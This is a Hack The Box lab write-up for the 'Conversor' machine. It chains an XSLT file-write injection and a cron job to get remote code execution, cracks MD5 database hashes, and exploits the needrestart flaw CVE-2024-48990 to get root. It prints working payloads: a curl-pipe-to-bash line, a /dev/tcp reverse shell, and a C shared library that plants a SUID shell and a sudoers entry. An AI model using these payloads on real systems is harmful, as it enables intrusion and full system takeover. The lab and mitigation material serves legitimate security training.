---
title: "HTB Machine Conversor"
date: 2025-10-30T11:54:11+02:00
draft: false 
tags: ["hackthebox", "writeup", "linux", "easy", "season 9"]
categories: ["CTF"]
---

**Target IP:** 10.10.11.92  
**Difficulty:** Medium  
**Operating System:** Ubuntu Linux

* * *

## Executive Summary

This writeup covers the exploitation of HTB Conversor, a machine that involves:

1.  **XSLT Code Injection** for initial access
2.  **Cron job exploitation** for command execution
3.  **Hash cracking** for user privilege escalation
4.  **CVE-2024-48990** (needrestart vulnerability) for root access

* * *

## Reconnaissance

### Port Scanning

```
sudo nmap -sC -sV 10.10.11.92

```

**Results:**

*   **Port 22/tcp:** OpenSSH 8.9p1 Ubuntu
*   **Port 80/tcp:** Apache httpd 2.4.52
*   **Redirect:** http://conversor.htb/

Add the hostname to `/etc/hosts`:

```
echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts

```

### Content Discovery

```
gobuster dir -u http://conversor.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt

```

**Discovered Endpoints:**

*   `/login` - Login page
*   `/register` - Registration page
*   `/logout` - Logout functionality
*   `/about` - About page with **source code download**
*   `/convert` - XML/XSLT conversion endpoint (405 Method Not Allowed on GET)

### Application Analysis

The web application is an XML to HTML converter that:

*   Accepts XML file uploads
*   Accepts XSLT stylesheet uploads
*   Transforms XML using XSLT into formatted output
*   Provides downloadable source code at `/about`

* * *

## Exploitation Part 1: XSLT Code Injection to RCE

### Understanding the Vulnerability

After downloading and analyzing the source code, two critical pieces of information were discovered:

1.  **Path traversal capability** in the `/convert` endpoint
2.  **Cron job configuration** from `install.md`:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done

```

This cron job executes **every minute** and runs all Python files in `/var/www/conversor.htb/scripts/`.

### The Attack Vector

The plan is to:

1.  Use XSLT injection to write a malicious Python file
2.  Place it in the `/scripts/` directory
3.  Wait for the cron job to execute it

### Creating the Malicious XSLT Stylesheet

The exploit uses **EXSLT Common** extension to write files to arbitrary locations.

**Create** `**shell.xslt**`**:**

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.81:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>
</xsl:stylesheet>

```

**Key Components Explained:**

*   `xmlns:shell="http://exslt.org/common"` - Imports EXSLT Common namespace
*   `extension-element-prefixes="shell"` - Enables the shell prefix
*   `<shell:document href="...">` - **Writes content to specified file path**
*   The Python code downloads and executes a bash reverse shell

### Preparing the Reverse Shell

**Create** `**shell.sh**`**:**

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.81/9001 0>&1

```

**Start HTTP server:**

```
python3 -m http.server 8000

```

**Start netcat listener:**

```
rlwrap nc -lvnp 9001

```

### Generating Valid XML

Use nmap to create a valid XML file:

```
sudo nmap -sC -sV 10.10.11.92 -oX nmap.xml

```

### Uploading and Triggering the Exploit

1.  Register an account on the web application
2.  Upload `nmap.xml` and `shell.xslt`
3.  Access the generated HTML file
4.  Wait up to 60 seconds for the cron job to execute

**Result:**

```
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.81] from (UNKNOWN) [10.10.11.92] 49408
bash: cannot set terminal process group (17504): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$

```

**Upgrade shell:**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm

```

* * *

## Exploitation Part 2: Lateral Movement (www-data → fismathack)

### Database Enumeration

Navigate to the application instance directory:

```
www-data@conversor:~$ cd ~/conversor.htb/instance
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db

```

**Extract user credentials:**

```
sqlite> .tables
files users

sqlite> .schema users
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT
);

sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test32|098f6bcd4621d373cade4e832627b4f6
6|user|2c103f2c4ed1e59c0b4e2e01821770fa
7|mike|a39b7395d52317737402460bf71b3086
8|test|cc03e747a6afbbcbf8be7668acfebee5
9|test777|83560a75c016ee68f0dd71bf1bb35b84
10|zaza|8ba97607a1485ccdbe19745ed80cd52d
11|test1|098f6bcd4621d373cade4e832627b4f6
12|1|c4ca4238a0b923820dcc509a6f75849b

```

### Hash Cracking

The passwords are stored as **MD5 hashes**. Using [CrackStation](https://crackstation.net/):

**Cracked credential:**

```
fismathack:Keepmesafeandwarm

```

### SSH Access

```
ssh fismathack@10.10.11.92

```

**Capture user flag:**

```
fismathack@conversor:~$ cat user.txt
9773**********************

```

* * *

## Exploitation Part 3: Privilege Escalation (fismathack → root)

### Sudo Privileges Enumeration

```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart

```

### Version Check

```
fismathack@conversor:~$ sudo /usr/sbin/needrestart -v
[main] eval /etc/needrestart/needrestart.conf
[main] needrestart v3.7

```

**Vulnerable!** Version 3.7 is affected by **CVE-2024-48990**.

### CVE-2024-48990 Exploitation

**Vulnerability Details:**

*   needrestart v3.5 - v3.7 contains a **local privilege escalation** vulnerability
*   The tool uses Python and can be exploited through **library hijacking**
*   By placing a malicious `__init__.so` in a custom PYTHONPATH, arbitrary code executes as root

### Building the Exploit

**On attacker machine:**

Clone the exploit repository:

```
git clone https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
cd CVE-2024-48990-PoC-Testing

```

**Create** `**lib.c**`**:**

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if(geteuid() == 0) {
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                           "chmod u+s /tmp/poc; "
                           "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                           "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
        system(shell);
    }
}

```

**Compile the shared library:**

```
# For x86_64 systems:
gcc -shared -fPIC -o __init__.so lib.c

# For ARM64/aarch64 (cross-compile):
x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c

```

### Modifying the Runner Script

**Create** `**runner.sh**`**:**

```
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

# Download the compiled shared library
curl http://10.10.14.118:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

# Python script to trigger import and wait for exploit
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null

```

### Executing the Exploit

**On attacker machine, start HTTP server:**

```
python3 -m http.server 8000

```

**On target (SSH session 1):**

```
fismathack@conversor:/dev/shm$ wget http://10.10.14.118:8000/runner.sh
fismathack@conversor:/dev/shm$ chmod +x runner.sh
fismathack@conversor:/dev/shm$ ./runner.sh

```

**On target (SSH session 2), trigger needrestart:**

```
fismathack@conversor:~$ sudo /usr/sbin/needrestart

```

**Exploit triggers:**

```
Got shell!, delete traces in /tmp/poc, /tmp/malicious
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
4df026a9********8399da329316

```

* * *

## Technical Analysis of Exploits

### XSLT Injection Deep Dive

**Why XSLT is Dangerous:**

XSLT (Extensible Stylesheet Language Transformations) is Turing-complete and includes powerful extensions:

*   **EXSLT Common** (`http://exslt.org/common`)
    *   `<exsl:document>` - Writes output to files
    *   Can specify arbitrary file paths
    *   No built-in path restrictions

**The Attack Chain:**

1.  XSLT processor loads the malicious stylesheet
2.  `<shell:document href="/path/to/file">` directive is processed
3.  Content between tags is written to specified path
4.  Cron job executes the Python file every minute
5.  Python script downloads and executes reverse shell

**Why This Worked:**

*   Application didn't sanitize XSLT input
*   No restrictions on output file paths
*   Cron job runs with `www-data` privileges
*   No file integrity monitoring

### CVE-2024-48990 Deep Dive

**The Vulnerability:**

needrestart uses Python's `importlib` to check which services need restarting. The vulnerability exists in how it handles Python module imports:

1.  needrestart executes Python code as root
2.  Python respects the `PYTHONPATH` environment variable
3.  An attacker can inject a malicious module path
4.  When Python imports `importlib`, it loads the attacker's code

**The Exploit Mechanism:**

```
static void a() __attribute__((constructor));

```

This GCC attribute causes the function to execute **before main()** when the shared library is loaded.

**The Payload:**

1.  Copies `/bin/sh` to `/tmp/poc`
2.  Sets SUID bit: `chmod u+s /tmp/poc`
3.  Adds sudoers entry for passwordless access
4.  All executed as root

**Why This Worked:**

*   needrestart v3.7 doesn't sanitize PYTHONPATH
*   Shared libraries with constructors execute immediately on load
*   Root privileges are inherited during the import process

* * *

## Mitigation Recommendations

### For the XSLT Vulnerability:

1.  **Disable EXSLT extensions** or use a restricted XSLT processor
2.  **Whitelist allowed XSLT elements** and namespaces
3.  **Sandbox file operations** - disallow `<exsl:document>`
4.  **Validate output paths** if file writing is necessary
5.  **Run XSLT transformations in isolated containers**

### For needrestart:

1.  **Update needrestart** to version 3.8 or later (patched)
2.  **Restrict sudo access** - users shouldn't need needrestart with sudo
3.  **Monitor PYTHONPATH** modifications in privileged contexts
4.  **Use AppArmor/SELinux** to restrict needrestart's file access

### General Security:

1.  **Never store passwords as MD5** - use bcrypt, Argon2, or PBKDF2
2.  **Implement rate limiting** on login attempts
3.  **Monitor cron jobs** for unauthorized modifications
4.  **Use file integrity monitoring** (AIDE, Tripwire)
5.  **Principle of least privilege** for cron jobs

* * *

## Tools Used

*   **nmap** - Port scanning and XML generation
*   **gobuster** - Directory enumeration
*   **sqlite3** - Database interrogation
*   **CrackStation** - MD5 hash cracking
*   **gcc** - Compiling exploit code
*   **Python** - HTTP server and reverse shell
*   **netcat** - Reverse shell listener

* * *

## Key Takeaways

1.  **XSLT is code execution** - treat it like any code injection vulnerability
2.  **Cron jobs are powerful attack vectors** when combined with file write primitives
3.  **Weak password hashing** enables lateral movement
4.  **Outdated software** (needrestart v3.7) leads to easy privilege escalation
5.  **Library injection attacks** are devastating when code runs as root

* * *

## Conclusion

HTB Conversor demonstrates a realistic attack chain combining:

*   **Application-level vulnerabilities** (XSLT injection)
*   **Configuration weaknesses** (cron jobs, sudo permissions)
*   **Cryptographic failures** (MD5 password storage)
*   **Vulnerable dependencies** (CVE-2024-48990)

This box emphasizes the importance of defense in depth and keeping systems updated.

**Flags Captured:**

*   User: `9773**********************`
*   Root: `4df026a9********8399da329316`

* * *
